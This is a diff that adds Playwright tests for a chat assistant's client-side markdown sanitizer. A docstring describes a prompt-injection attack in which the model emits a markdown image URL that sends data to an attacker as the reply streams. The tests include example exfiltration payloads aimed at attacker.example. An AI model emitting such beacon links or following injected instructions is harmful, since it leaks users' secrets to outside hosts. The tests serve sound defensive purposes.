@@ -147,6 +147,34 @@ class AssistantMarkdownRenderingTests(PlaywrightTestCase):
         )
         self.assertNotIn("onerror", html)
 
+    def test_markdown_image_stripped_in_stream_path(self):
+        """A markdown image is dropped entirely client-side (no <img>, no src).
+
+        Wave 3 exfil-beacon fix: the client DOMPurify config now mirrors the
+        server nh3 allowlist (no img/style/src). Without it, a prompt injection
+        that made the model emit `![x](https://attacker/leak?d=...)` rendered a
+        real <img> during streaming and fired a zero-click outbound GET before
+        the strict server render replaced it on reload.
+        """
+        self.page.goto(self.url(f"/assistant/{self.session.pk}/"))
+        html = self.page.evaluate(
+            'renderMarkdown("![status](https://attacker.example/leak?d=secret)")'
+        )
+        self.assertNotIn("<img", html)
+        self.assertNotIn("attacker.example", html)
+
+    def test_raw_img_and_style_stripped_in_stream_path(self):
+        """Raw <img> and <style> tags are removed, matching the server policy."""
+        self.page.goto(self.url(f"/assistant/{self.session.pk}/"))
+        html = self.page.evaluate(
+            'renderMarkdown("<img src=\\"https://attacker.example/p.gif\\">'
+            '<style>body{background:url(https://attacker.example/c)}</style>text")'
+        )
+        self.assertNotIn("<img", html)
+        self.assertNotIn("<style", html)
+        self.assertNotIn("attacker.example", html)
+        self.assertIn("text", html)
+
     def test_sanitize_preserves_repaired_hrefs(self):
         """Sanitization runs after the bare-app-href repair and keeps the fixed link."""
         self.page.goto(self.url(f"/assistant/{self.session.pk}/"))
